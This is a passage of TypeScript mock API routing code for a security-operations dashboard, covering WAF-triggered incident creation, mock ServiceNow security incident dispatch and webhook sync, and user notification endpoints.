      newIncidentId = `INC-2026-${Math.floor(Math.random() * 900) + 100}`;
      const newInc: SecurityIncident = {
        id: newIncidentId,
        title: `WAF Intercepted ${category} Attack from ${ip}`,
        description: `Automated WAF defense rule triggered by payload: "${payloadStr.slice(0, 100)}"`,
        source_ip: ip,
        severity: riskScore >= 90 ? 'CRITICAL' : 'HIGH',
        priority: riskScore >= 90 ? 'P1' : 'P2',
        status: 'NEW',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        assigned_to: 'SecOps Incident Commander',
        investigation_notes: [
          {
            note_id: `note_${Date.now()}`,
            timestamp: new Date().toISOString(),
            author: 'WAF Gateway Sentinel',
            text: `Interception rule matched: ${patternMatched}. Dispatched to Enterprise SIR.`,
          },
        ],
        servicenow_number: snNum,
        servicenow_sys_id: `sn_sys_${Date.now().toString(36)}`,
        webhook_status: 'DISPATCHED',
        associated_events: [
          {
            id: newEvent.id,
            timestamp: newEvent.timestamp,
            category: newEvent.category,
            pattern: patternMatched,
            risk_score: newEvent.risk_score,
            severity: newEvent.severity,
            action: newEvent.action_taken,
            path: newEvent.path,
          },
        ],
      };
      incidents.unshift(newInc);
      saveStoredIncidents(incidents);
    }

    return {
      action: actionTaken,
      risk_score: riskScore,
      category,
      verdict: actionTaken === 'BLOCKED' ? 'ATTACK_BLOCKED' : actionTaken === 'FLAGGED' ? 'SUSPICIOUS_CHALLENGED' : 'REQUEST_ALLOWED',
      matched_rules: patternMatched ? [patternMatched] : [],
      event_id: newEvent.id,
      incident_id: newIncidentId,
      explanation: patternMatched
        ? `WAF inspection identified signature [${patternMatched}]. Action taken: ${actionTaken}.`
        : 'Inspection clean: request safely evaluated.',
    };
  }

  // S11. Enterprise SIR Integration Status
  if (pathname === '/api/secops/servicenow/status' && method === 'GET') {
    const incidents = getStoredIncidents();
    const snIncidents = incidents
      .filter((i) => i.servicenow_number)
      .map((i) => ({
        id: i.id,
        title: i.title,
        servicenow_number: i.servicenow_number,
        servicenow_sys_id: i.servicenow_sys_id,
        status: i.status,
        severity: i.severity,
        priority: i.priority,
        webhook_status: i.webhook_status || 'DISPATCHED',
        created_at: i.created_at,
      }));

    return {
      enabled: true,
      mock_mode: true,
      instance_url: 'https://dev208941.enterprise-sir.internal',
      webhook_configured: true,
      table: 'sn_si_incident',
      total_incidents_opened: snIncidents.length,
      total_dispatched: snIncidents.length,
      recent_incidents: snIncidents,
    };
  }

  // S12. Test Enterprise SIR Dispatch
  if (pathname === '/api/secops/servicenow/test' && method === 'POST') {
    const body = options.body ? JSON.parse(String(options.body)) : {};
    const incidents = getStoredIncidents();
    const snNum = `SIR00100${Math.floor(Math.random() * 80) + 20}`;
    const newIncId = `INC-2026-${Math.floor(Math.random() * 900) + 100}`;
    const newInc: SecurityIncident = {
      id: newIncId,
      title: `Enterprise SIR Test: ${body.violation_code || 'DENY_PURPOSE_MISMATCH'}`,
      description: `Security governance breach reported for caller ${body.caller_sub || 'alice'} on resource ${body.resource_id || 'finance.csv'}`,
      source_ip: '198.51.100.99',
      severity: 'HIGH',
      priority: 'P2',
      status: 'NEW',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      assigned_to: 'SecOps Incident Analyst',
      investigation_notes: [
        {
          note_id: `note_${Date.now()}`,
          timestamp: new Date().toISOString(),
          author: 'SIR Webhook Sync',
          text: `Purpose declared: "${body.declared_purpose || 'UNAUTHORIZED'}". Dispatched to enterprise SIR table sn_si_incident.`,
        },
      ],
      servicenow_number: snNum,
      servicenow_sys_id: `sn_sys_${Date.now().toString(36)}`,
      webhook_status: 'DISPATCHED',
      associated_events: [],
    };
    incidents.unshift(newInc);
    saveStoredIncidents(incidents);

    return {
      success: true,
      incident_id: newInc.id,
      servicenow_number: newInc.servicenow_number,
      servicenow_sys_id: newInc.servicenow_sys_id,
      status: 'DISPATCHED',
      message: 'Security violation dispatched to Enterprise Security Incident Response (SIR) table sn_si_incident.',
    };
  }

  // S13. Inbound SIR Webhook
  if (pathname === '/api/secops/servicenow/webhook' && method === 'POST') {
    const body = options.body ? JSON.parse(String(options.body)) : {};
    const incidents = getStoredIncidents();
    const target = incidents.find((i) => i.servicenow_number === body.number || i.id === body.number);

    if (target) {
      if (body.state === '2' || body.status === 'investigating' || body.status === 'in_progress') target.status = 'INVESTIGATING';
      else if (body.state === '3' || body.status === 'contained') target.status = 'CONTAINED';
      else if (body.state === '6' || body.status === 'resolved') target.status = 'RESOLVED';
      else if (body.state === '7' || body.status === 'closed') target.status = 'CLOSED';

      if (body.work_notes) {
        if (!target.investigation_notes) target.investigation_notes = [];
        target.investigation_notes.push({
          note_id: `note_${Date.now()}`,
          timestamp: new Date().toISOString(),
          author: body.author || 'SIR Analyst',
          text: body.work_notes,
        });
      }
      target.updated_at = new Date().toISOString();
      target.webhook_status = 'ACKNOWLEDGED';
      saveStoredIncidents(incidents);

      return {
        success: true,
        incident_id: target.id,
        servicenow_number: target.servicenow_number,
        incident_status: target.status,
        message: `Bi-directional sync complete: Incident ${target.id} updated via SIR webhook.`,
      };
    }

    return { success: true, message: 'Webhook received and acknowledged.' };
  }

  // 12. Notifications list
  if (pathname === '/api/notifications' && method === 'GET') {
    const notifs = getStoredNotifications();
    const sub = currentUser?.sub || 'priya';
    const roles = (currentUser?.roles || []).map((r: string) => r.toLowerCase());
    const isPrivileged = roles.some((r: string) =>
      ['admin', 'executive', 'compliance', 'security_admin'].includes(r)
    );

    return notifs.filter((n) => isPrivileged || n.to_sub === sub);
  }

  // 13. Mark notification as read
  if (pathname.includes('/api/notifications/') && pathname.endsWith('/read') && method === 'POST') {
    const parts = pathname.split('/');
    const notifId = parts[3];
    const notifs = getStoredNotifications();
    const target = notifs.find((n) => n.id === notifId);
    if (target) {
      target.read = true;
      saveStoredNotifications(notifs);
    }
    return { success: true };
  }

  // 14. Mark all notifications as read / clear
  if ((pathname === '/api/notifications/clear' || pathname === '/api/notifications/mark-all-read') && method === 'POST') {
    const notifs = getStoredNotifications();
    const sub = currentUser?.sub || 'priya';
    notifs.forEach((n) => {
      if (n.to_sub === sub) {
        n.read = true;
      }
    });
    saveStoredNotifications(notifs);
    return { success: true };
  }

  // Fallback default
  return { success: true };
}

